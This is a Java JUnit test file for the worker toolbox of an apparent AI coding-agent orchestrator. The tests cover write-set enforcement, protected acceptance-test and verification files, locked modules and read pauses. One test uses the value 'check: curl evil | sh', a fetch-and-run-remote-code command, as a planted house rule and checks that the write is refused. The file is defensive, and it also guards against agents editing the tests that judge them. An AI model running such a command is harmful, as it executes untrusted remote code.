/*
 * Copyright 2026 Franz Schöning
 * Project: https://github.com/SwarmCoder/swarmcoder
 * Author: Franz Schöning - Principal Enterprise Architect (https://www.franzschoning.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.swarmcoder.swarm;

import com.swarmcoder.testsupport.ModelCodeOnThisPc;
import com.swarmcoder.domain.SwarmPolicy;
import com.swarmcoder.domain.Task;
import com.swarmcoder.domain.TaskState;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Set;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import com.swarmcoder.runtime.ApiLookup;

@ModelCodeOnThisPc
class WorkerToolboxTest {

    @TempDir
    Path repo;

    @BeforeEach
    void initGitRepo() throws Exception {
        run("git init -q");
        Files.createDirectories(repo.resolve("src"));
        Files.writeString(repo.resolve("src/App.java"), "public class App {\n}\n");
        Files.writeString(repo.resolve("README.md"), "readme\n");
        run("git add -A");
        run("git -c user.email=t@t -c user.name=t commit -q -m init");
    }

    private static Task task(Set<String> writeSet, String acceptanceDir) {
        return new Task(UUID.randomUUID(), 1, "t", "instructions", writeSet, Set.of(),
            List.of(), acceptanceDir, null, null,
            new SwarmPolicy(1, false, 0.2, 0.2, List.of()), TaskState.READY);
    }

    private static final String PATCH = """
        diff --git a/src/App.java b/src/App.java
        --- a/src/App.java
        +++ b/src/App.java
        @@ -1,2 +1,4 @@
         public class App {
        +    // added by worker
        +    int x = 1;
         }
        """;

    @Test
    void appliesDiffInsideWriteSet() throws IOException {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null));

        String result = toolbox.applyDiff(PATCH);

        assertThat(result).startsWith("applied cleanly");
        assertThat(Files.readString(repo.resolve("src/App.java"))).contains("added by worker");
        assertThat(toolbox.blockingViolations()).isZero();
    }

    /**
     * The behaviour this class was rewritten for (2026-09-02). A diff outside the write set is
     * APPLIED and the path recorded; it is not refused and it does not count toward the kill.
     *
     * <p>Three of thirteen candidates on the operator's live run died of the old rule, and none of
     * them was misbehaving - two were re-creating a class a parallel task had not delivered yet,
     * and one was killed at turn 102 by the data file its own test run had written. The write set
     * is chosen from a plan before any code exists; whether going outside it was right is a
     * judgement about a diff, and it is now made where the diff can be read.
     */
    @Test
    void aDiffOutsideTheWriteSetIsAppliedAndRecordedRatherThanRefused() throws IOException {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("docs"), null));

        String result = toolbox.applyDiff(PATCH);

        assertThat(result).startsWith("applied cleanly").contains("[write policy]")
            .contains("outside the paths reserved for your task").contains("KEPT");
        assertThat(Files.readString(repo.resolve("src/App.java"))).contains("added by worker");
        assertThat(toolbox.outOfWriteSetPaths()).containsExactly("src/App.java");
        assertThat(toolbox.blockingViolations()).isZero();
    }

    /** The same for a whole-file write, which is the tool small models actually reach for. */
    @Test
    void writeFileOutsideTheWriteSetIsWrittenAndRecordedRatherThanRefused() throws IOException {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("docs"), null));

        String result = toolbox.writeFile("src/App.java", "class App { int x = 1; }");

        assertThat(result).startsWith("wrote src/App.java").contains("[write policy]");
        assertThat(Files.readString(repo.resolve("src/App.java"))).contains("int x = 1");
        assertThat(toolbox.outOfWriteSetPaths()).containsExactly("src/App.java");
        assertThat(toolbox.blockingViolations()).isZero();
    }

    /** The same file six times is ONE file out of bounds, not six. */
    @Test
    void theSameOutOfSetFileIsCountedOnce() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("docs"), null));

        toolbox.writeFile("src/App.java", "class App {}");
        String second = toolbox.writeFile("src/App.java", "class App { int y; }");

        assertThat(toolbox.outOfWriteSetPaths()).containsExactly("src/App.java");
        // Told once. Repeating the warning on every write is noise the model learns to skip.
        assertThat(second).doesNotContain("[write policy]");
    }

    @Test
    void protectsAcceptanceTestDirEvenWithOpenWriteSet() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of(), "src"));

        String result = toolbox.applyDiff(PATCH);

        assertThat(result).startsWith("error:").contains("protected");
        assertThat(toolbox.blockingViolations()).isEqualTo(1);
    }

    @Test
    void writeFileReplacesContentInsideWriteSet() throws IOException {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null));

        String result = toolbox.writeFile("src/App.java",
            "public class App {\n    int x = 1;\n}");

        assertThat(result).startsWith("wrote src/App.java");
        assertThat(Files.readString(repo.resolve("src/App.java")))
            .contains("int x = 1").endsWith("\n");
        // New files inside the write set are fine too (parents created).
        assertThat(toolbox.writeFile("src/util/New.java", "public class New {}"))
            .startsWith("wrote");
        assertThat(Files.exists(repo.resolve("src/util/New.java"))).isTrue();
        assertThat(toolbox.blockingViolations()).isZero();
    }

    /**
     * The line between the two kinds of refusal, in one test.
     *
     * <p>Outside the write set: written, recorded, survivable. The acceptance-test directory and
     * anything outside the repository: refused, never written, counted toward the kill. The middle
     * one is the one that must never soften - {@code AuthoredTestAudit} exists because a candidate
     * editing the test that judges it is the single thing this system cannot allow.
     */
    @Test
    void writeFileRecordsOutOfSetButStillRefusesProtectedAndEscapingPaths() throws IOException {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("docs"), "src/test"));

        assertThat(toolbox.writeFile("src/App.java", "kept"))
            .startsWith("wrote").contains("[write policy]");
        assertThat(toolbox.writeFile("src/test/Accept.java", "nope"))
            .startsWith("error:").contains("protected");
        assertThat(toolbox.writeFile("../escape.txt", "nope")).startsWith("error:");

        assertThat(Files.readString(repo.resolve("src/App.java"))).contains("kept");
        assertThat(Files.exists(repo.resolve("src/test/Accept.java"))).isFalse();
        assertThat(toolbox.outOfWriteSetPaths()).containsExactly("src/App.java");
        assertThat(toolbox.blockingViolations()).isEqualTo(2);
    }

    @Test
    void operatorLockedModuleIsRefusedByBothWriteToolsInsideTheWriteSet() throws IOException {
        // The task's write set covers src/ entirely — and the operator locked one file inside it.
        // A locked module is not "outside the write set", it is off limits regardless of it.
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null),
            ApiLookup.UNAVAILABLE, null, null, List.of("src/App.java"));

        assertThat(toolbox.applyDiff(PATCH)).startsWith("error:").contains("locked module");
        assertThat(Files.readString(repo.resolve("src/App.java")))
            .isEqualTo("public class App {\n}\n");
        assertThat(toolbox.blockingViolations()).isEqualTo(1);

        assertThat(toolbox.writeFile("src/App.java", "class Replaced {}"))
            .startsWith("error:").contains("locked module");
        assertThat(Files.readString(repo.resolve("src/App.java")))
            .isEqualTo("public class App {\n}\n");
        assertThat(toolbox.blockingViolations()).isEqualTo(2);

        // The rest of the write set is unaffected — the lock is a hole in it, not a ban.
        assertThat(toolbox.writeFile("src/Other.java", "class Other {}")).startsWith("wrote");
    }

    @Test
    void lockedFolderCoversEverythingBeneathItEvenWithNoWriteSet() {
        // No write set at all (unrestricted) is the weakest case there is; the lock still holds,
        // and it holds for the whole subtree, not just the folder entry itself.
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of(), null),
            ApiLookup.UNAVAILABLE, null, null, List.of("src/generated/"));

        assertThat(toolbox.writeFile("src/generated/deep/Gen.java", "class Gen {}"))
            .startsWith("error:").contains("locked module");
        assertThat(Files.exists(repo.resolve("src/generated/deep/Gen.java"))).isFalse();
        assertThat(toolbox.blockingViolations()).isEqualTo(1);
    }

    @Test
    void absoluteProjectPathsAreMappedToRepositoryRelative() throws IOException {
        // The worktree is the repo the tools operate on; the model, however, was shown the
        // ORIGINAL project path and emits it absolutely — that must still land in the write set.
        Path projectRoot = repo.resolveSibling("myhelloworld-src");
        Files.createDirectories(projectRoot);
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src", "pom.xml"), null),
            ApiLookup.UNAVAILABLE, projectRoot);

        // Absolute path under the project root → relative, inside the write set, written.
        String abs = projectRoot.toString().replace('\\', '/') + "/pom.xml";
        assertThat(toolbox.writeFile(abs, "<project/>")).startsWith("wrote pom.xml");
        assertThat(Files.readString(repo.resolve("pom.xml"))).contains("<project/>");

        // Absolute path under the worktree itself also normalizes.
        String wt = repo.toString().replace('\\', '/') + "/src/App.java";
        assertThat(toolbox.writeFile(wt, "class App {}")).startsWith("wrote src/App.java");
        assertThat(toolbox.blockingViolations()).isZero();

        // toRelative leaves already-relative paths alone.
        assertThat(toolbox.toRelative("src/main/Foo.java")).isEqualTo("src/main/Foo.java");
    }

    @Test
    void recountToleratesMiscountedHunkHeaders() throws IOException {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null));
        // Wrong line counts in the @@ header — the signature qwen failure git apply
        // rejects without --recount.
        String sloppy = """
            --- a/src/App.java
            +++ b/src/App.java
            @@ -1,9 +1,9 @@
             public class App {
            +    int recounted = 1;
             }
            """;

        assertThat(toolbox.applyDiff(sloppy)).startsWith("applied cleanly");
        assertThat(Files.readString(repo.resolve("src/App.java"))).contains("recounted");
    }

    /**
     * The pom.xml defect (2026-09-03): the 27B model produces malformed unified diffs for XML —
     * {@code git apply} rejects them outright ({@code No valid patches in input}) — and the
     * worker was told only the raw git error, with no way to know a completely different tool
     * would work. The first rejection for a file now says so.
     */
    private static final String CORRUPT_DIFF = """
        diff --git a/src/App.java b/src/App.java
        --- a/src/App.java
        +++ b/src/App.java
        @@ -1,1 +1,1 @@
        this hunk body has no leading +/-/space marker at all
        """;

    @Test
    void aRejectedApplyDiffTellsTheWorkerToUseWriteFileInstead() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null));

        String result = toolbox.applyDiff(CORRUPT_DIFF);

        assertThat(result).startsWith("error:")
            .contains("Your patch was not a valid unified diff")
            .contains("use write_file with the whole file content instead");
    }

    @Test
    void theWriteFileHintIsToldOnlyOnceForTheSameFile() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null));

        toolbox.applyDiff(CORRUPT_DIFF);
        String second = toolbox.applyDiff(CORRUPT_DIFF);

        assertThat(second).startsWith("error:")
            .doesNotContain("Your patch was not a valid unified diff");
    }

    @Test
    void aValidPatchNeverCarriesTheWriteFileHint() throws IOException {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null));

        String result = toolbox.applyDiff(PATCH);

        assertThat(result).doesNotContain("Your patch was not a valid unified diff");
    }

    @Test
    void execAndReadWork() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of(), null));

        assertThat(toolbox.exec("git status --short")).startsWith("exit=0");
        assertThat(toolbox.read("README.md")).contains("readme");
        assertThat(toolbox.read("missing.txt")).startsWith("error:");
    }

    /**
     * The second nudge (sixteen calls) used to be the end of the story — a worker that ignored it
     * just kept reading until the twenty-four call kill, with nothing written either time. Now the
     * seventeenth looking-only call in a row is not executed at all: it gets the pause text
     * instead, and only a write clears it.
     */
    @Test
    void theSeventeenthLookingOnlyCallIsPausedInsteadOfExecuted() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null));

        for (int i = 0; i < 16; i++) {
            assertThat(toolbox.read("src/App.java")).doesNotContain("Reading is paused");
        }
        String seventeenth = toolbox.read("src/App.java");

        assertThat(seventeenth).isEqualTo(WorkerToolbox.READ_PAUSE_TEXT)
            .contains("Reading is paused")
            .contains("16 things")
            .contains("Reading resumes after your first write");
        // Still counts toward the twenty-four call backstop, unchanged.
        assertThat(toolbox.investigationToolCalls()).isEqualTo(17);

        // It keeps happening, not just once.
        assertThat(toolbox.read("src/App.java")).isEqualTo(WorkerToolbox.READ_PAUSE_TEXT);
        assertThat(toolbox.lookupApi("anything")).isEqualTo(WorkerToolbox.READ_PAUSE_TEXT);
    }

    /** A write ends the pause immediately, exactly as it already ends the nudge count. */
    @Test
    void aWriteEndsThePauseAndReadingResumes() throws IOException {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null));

        for (int i = 0; i < 20; i++) {
            toolbox.read("src/App.java");
        }
        assertThat(toolbox.readingPaused()).isTrue();

        assertThat(toolbox.writeFile("src/New.java", "class New {}")).startsWith("wrote ");
        assertThat(toolbox.readingPaused()).isFalse();
        assertThat(toolbox.investigationToolCalls()).isZero();

        String afterWrite = toolbox.read("src/App.java");
        assertThat(afterWrite).doesNotContain("Reading is paused").contains("public class App");
    }

    /**
     * A build or test command still runs while reading is paused — the worker needs the
     * compiler's own verdict to recover, and refusing it would make the pause harder to get out
     * of rather than easier. An ordinary command gets the same pause text as read/lookup_api.
     */
    @Test
    void aBuildCommandRunsThroughThePauseButAnOrdinaryCommandDoesNot() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null));

        for (int i = 0; i < 16; i++) {
            toolbox.read("src/App.java");
        }
        assertThat(toolbox.readingPaused()).isTrue();

        assertThat(toolbox.exec("git status --short")).isEqualTo(WorkerToolbox.READ_PAUSE_TEXT);

        String built = toolbox.exec("javac -version");
        assertThat(built).doesNotContain("Reading is paused").startsWith("exit=");
    }

    /**
     * 2026-09-25: the Librarian sizes a lookup answer for the workers' room, so the toolbox must not
     * cut it back to the baseline's 8,000 on its way to a DeepSeek worker — and must still cut it
     * there for a worker whose room is the baseline.
     */
    @Test
    void aLookupAnswerIsCutAtTheWorkersOwnRoomNotAtTheBaseline() {
        String longAnswer = "a".repeat(15_000) + "MARKERPASTEIGHTTHOUSAND" + "b".repeat(5_000);
        WorkerToolbox baseline = new WorkerToolbox(repo, task(Set.of(), null), query -> longAnswer);
        WorkerToolbox deepSeek = new WorkerToolbox(repo, task(Set.of(), null), query -> longAnswer);
        deepSeek.setMaterialBudget(com.swarmcoder.inference.MaterialBudget.of(
            com.swarmcoder.inference.ModelShapes.get("deepseek-v4-flash-ds4")));

        assertThat(baseline.lookupApi("widget"))
            .contains("[truncated")
            .doesNotContain("MARKERPASTEIGHTTHOUSAND");
        assertThat(deepSeek.lookupApi("widget"))
            .as("40,960 characters at 262,144 tokens of room: the whole 20,000-character answer")
            .contains("MARKERPASTEIGHTTHOUSAND")
            .doesNotContain("[truncated");
    }

    @Test
    void lookupApiDelegatesToTheConfiguredSourceAndDefaultsToUnavailable() {
        WorkerToolbox withLookup = new WorkerToolbox(repo, task(Set.of(), null),
            query -> "DOCS for " + query);
        assertThat(withLookup.lookupApi("jackson ObjectMapper")).isEqualTo("DOCS for jackson ObjectMapper");
        assertThat(withLookup.lookupApi("  ")).startsWith("error:");

        WorkerToolbox noLookup = new WorkerToolbox(repo, task(Set.of(), null));
        assertThat(noLookup.lookupApi("anything")).contains("not configured");
    }

    /**
     * A stub source that actually implements the exclusion/boost overload — a plain lambda
     * cannot, since a lambda only ever supplies the single abstract method — records exactly what
     * WorkerToolbox passed it on each call, so the plumbing between the toolbox and the real
     * search (the Librarian, in production) can be checked without standing up a Lucene index.
     */
    private static final class RecordingLookup implements ApiLookup {
        final List<Set<String>> givenPerCall = new java.util.ArrayList<>();
        final List<Set<String>> newTermsPerCall = new java.util.ArrayList<>();
        String nextAnswer = "";

        @Override
        public String lookup(String query) {
            throw new AssertionError("the one-arg method must not be called once the exclusion "
                + "overload is available");
        }

        @Override
        public String lookup(String query, Set<String> alreadyGivenSections, Set<String> newTerms) {
            givenPerCall.add(Set.copyOf(alreadyGivenSections));
            newTermsPerCall.add(Set.copyOf(newTerms));
            return nextAnswer;
        }
    }

    /**
     * Every documentation section a {@code lookup_api} answer carries — not only the leading one
     * — is remembered, and passed back on the NEXT call so the lookup source can skip it. This is
     * the plumbing behind "never hand the same worker the same section twice": WorkerToolbox does
     * not rank anything itself, but it is what keeps the "already given" set across calls and
     * hands it to whatever answers the question.
     */
    @Test
    void everySectionAnAnswerCarriedIsExcludedFromTheNextCall() {
        RecordingLookup lookup = new RecordingLookup();
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of(), null), lookup);

        lookup.nextAnswer = "Documentation for \"first\":\n\n#### docs/a.md › Alpha\nbody one\n"
            + "\n#### docs/b.md › Beta\nbody two\n";
        toolbox.lookupApi("first");
        lookup.nextAnswer = "Documentation for \"second\":\n\n#### docs/c.md › Gamma\nbody three\n";
        toolbox.lookupApi("second");

        assertThat(lookup.givenPerCall.get(0))
            .as("nothing has been given before the first call")
            .isEmpty();
        assertThat(lookup.givenPerCall.get(1))
            .as("both sections the first answer carried, not only the leading one")
            .containsExactlyInAnyOrder("docs/a.md › Alpha", "docs/b.md › Beta");
    }

    /**
     * A word this worker's question adds, that none of its earlier questions used, is passed as a
     * "new term" — the signal the ranking boosts toward. A word it already used is not, and the
     * very first question's words all count (there is nothing yet to distinguish it from).
     */
    @Test
    void wordsNotAskedBeforeArePassedAsNewTerms() {
        RecordingLookup lookup = new RecordingLookup();
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of(), null), lookup);

        toolbox.lookupApi("persistiron widget assembly");
        toolbox.lookupApi("persistiron widget createDefaultRoot");

        assertThat(lookup.newTermsPerCall.get(0))
            .as("the first question's words all count as new")
            .containsExactlyInAnyOrder("persistiron", "widget", "assembly");
        assertThat(lookup.newTermsPerCall.get(1))
            .as("only the word the second question actually added")
            .containsExactlyInAnyOrder("createdefaultroot");
    }

    @Test
    void extractsTouchedPathsFromUnifiedDiff() {
        assertThat(WorkerToolbox.touchedPaths(PATCH)).containsExactly("src/App.java");
        assertThat(WorkerToolbox.touchedPaths("+++ /dev/null\n")).isEmpty();
    }

    private void run(String command) throws Exception {
        Process p = (System.getProperty("os.name").toLowerCase().contains("win")
            ? new ProcessBuilder("cmd.exe", "/c", command)
            : new ProcessBuilder("sh", "-c", command))
            .directory(repo.toFile()).redirectErrorStream(true).start();
        String out = new String(p.getInputStream().readAllBytes());
        if (p.waitFor() != 0) {
            throw new IllegalStateException(command + " failed: " + out);
        }
    }

    // --- exec write audit ------------------------------------------------------------------

    /**
     * A shell write outside the write set is KEPT and recorded (2026-09-02), where it used to be
     * silently reverted.
     *
     * <p>The revert was what killed the 102-turn candidate: it started the EclipseStore service it
     * had just written, the store wrote its data file, the audit reverted the file and counted it,
     * and that was violation number two. An effect-based audit cannot tell that file from a class
     * the task genuinely needed. Both are now kept and both are named on the candidate, where the
     * judge and the operator can tell them apart by looking.
     */
    @Test
    void aShellCommandWritingOutsideTheWriteSetIsKeptAndRecorded() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null),
            ApiLookup.UNAVAILABLE, null, null, List.of());

        String result = toolbox.exec(writeOutside("README.md", "OWNED"));

        assertThat(result).contains("[write policy]").contains("README.md").contains("KEPT");
        assertThat(readFile("README.md")).contains("OWNED");
        assertThat(toolbox.outOfWriteSetPaths()).contains("README.md");
        assertThat(toolbox.blockingViolations()).isZero();
    }

    @Test
    void aShellCommandCreatingAnUntrackedFileOutsideTheWriteSetKeepsIt() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null),
            ApiLookup.UNAVAILABLE, null, null, List.of());

        toolbox.exec(writeOutside("planted.sh", "echo hello"));

        assertThat(Files.exists(repo.resolve("planted.sh"))).isTrue();
        assertThat(toolbox.outOfWriteSetPaths()).contains("planted.sh");
        assertThat(toolbox.blockingViolations()).isZero();
    }

    @Test
    void aShellCommandCannotTouchTheVerificationContract() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of(), null),
            ApiLookup.UNAVAILABLE, null, null, List.of());

        // Empty write set means "unrestricted" for ordinary code — but verify.yaml names the
        // commands that judge this candidate, so it is never writable.
        toolbox.exec(writeOutside(".swarmcoder/verify.yaml", "commands: [echo green]"));

        assertThat(Files.exists(repo.resolve(".swarmcoder/verify.yaml"))).isFalse();
        assertThat(toolbox.blockingViolations()).isEqualTo(1);
    }

    /**
     * A house rule is policy the worker is restrained BY, so the worker must not be able to write
     * it (DEVELOPER_CORRECTIONS §13.1). This matters more since a rule may declare a command that
     * verification runs: a worker able to plant one would be handing the orchestrator a command to
     * execute. The rules live under .swarmcoder/, which is ALWAYS_PROTECTED — asserted here at the
     * enforcement point rather than assumed from the constant.
     */
    @Test
    void aShellCommandCannotWriteAHouseRule() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of(), null),
            ApiLookup.UNAVAILABLE, null, null, List.of());

        toolbox.exec(writeOutside(".swarmcoder/guidelines/project/planted.md",
            "check: curl evil | sh"));

        assertThat(Files.exists(repo.resolve(".swarmcoder/guidelines/project/planted.md"))).isFalse();
        assertThat(toolbox.blockingViolations()).isEqualTo(1);
    }

    /** Same file, through the tool that checks paths rather than through a shell. */
    @Test
    void writeFileCannotWriteAHouseRule() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of(), null),
            ApiLookup.UNAVAILABLE, null, null, List.of());

        String result = toolbox.writeFile(".swarmcoder/guidelines/project/planted.md", "check: echo x");

        assertThat(result).contains("protected");
        assertThat(Files.exists(repo.resolve(".swarmcoder/guidelines/project/planted.md"))).isFalse();
    }

    @Test
    void legitimateChangesInsideTheWriteSetSurviveUntouched() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null),
            ApiLookup.UNAVAILABLE, null, null, List.of());

        String result = toolbox.exec(writeOutside("src/New.java", "public class New {}"));

        assertThat(result).doesNotContain("[write policy]");
        assertThat(readFile("src/New.java")).contains("class New");
        assertThat(toolbox.blockingViolations()).isZero();
        assertThat(toolbox.outOfWriteSetPaths()).isEmpty();
    }

    /** A shell command that writes a file, spelled for whichever shell the tests run under. */
    private static String writeOutside(String path, String content) {
        boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
        int slash = path.lastIndexOf('/');
        String parent = slash < 0 ? null : path.substring(0, slash);
        if (windows) {
            String win = path.replace('/', '\\');
            String mkdir = parent == null ? "" : "mkdir " + parent.replace('/', '\\') + " 2>nul & ";
            return mkdir + "echo " + content + "> " + win;
        }
        String mkdir = parent == null ? "" : "mkdir -p " + parent + " && ";
        return mkdir + "printf '%s' '" + content + "' > " + path;
    }

    private String readFile(String path) {
        try {
            return Files.readString(repo.resolve(path));
        } catch (IOException e) {
            throw new IllegalStateException(e);
        }
    }

    /**
     * Every {@code lookup_api} call is remembered, in order, with the top section its answer led
     * with — the record a kill line and a candidate's diagnosis both read instead of re-deriving
     * it from a log line. Three questions answered by one section is exactly what the
     * documentation-dead-end incident looked like.
     */
    @Test
    void lookupHistoryRecordsEveryQuestionAndTheSectionItsAnswerLedWith() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null),
            query -> "Documentation for \"" + query + "\":\n\n#### docs/guides/persistence.md "
                + "› Saving data\nCall the storage instance's storeAll() when you are done.\n");

        toolbox.lookupApi("EclipseStore root store setup");
        toolbox.lookupApi("how to get storage instance");
        toolbox.lookupApi("ZeroZDbNode embedded factory");

        assertThat(toolbox.lookupHistory()).containsExactly(
            new WorkerToolbox.LookupQuestion("EclipseStore root store setup",
                "docs/guides/persistence.md › Saving data"),
            new WorkerToolbox.LookupQuestion("how to get storage instance",
                "docs/guides/persistence.md › Saving data"),
            new WorkerToolbox.LookupQuestion("ZeroZDbNode embedded factory",
                "docs/guides/persistence.md › Saving data"));
    }

    /** A question longer than 100 characters is truncated before it is remembered. */
    @Test
    void aLongQuestionIsTruncatedInTheHistory() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null),
            query -> "Documentation for \"" + query + "\":\n\n#### docs/guides/x.md › Heading\nbody\n");
        String longQuestion = "q".repeat(150);

        toolbox.lookupApi(longQuestion);

        assertThat(toolbox.lookupHistory()).hasSize(1);
        assertThat(toolbox.lookupHistory().get(0).question()).hasSize(100);
    }

    /** Only the last twelve questions are kept — enough to show the pattern, not the whole run. */
    @Test
    void lookupHistoryIsCappedAtTheLastTwelveQuestions() {
        WorkerToolbox toolbox = new WorkerToolbox(repo, task(Set.of("src"), null),
            query -> "Documentation for \"" + query + "\":\n\n#### docs/guides/x.md › Heading\nbody\n");

        for (int i = 1; i <= 15; i++) {
            toolbox.lookupApi("question " + i);
        }

        assertThat(toolbox.lookupHistory()).hasSize(12);
        assertThat(toolbox.lookupHistory().get(0).question()).isEqualTo("question 4");
        assertThat(toolbox.lookupHistory().get(11).question()).isEqualTo("question 15");
    }
}
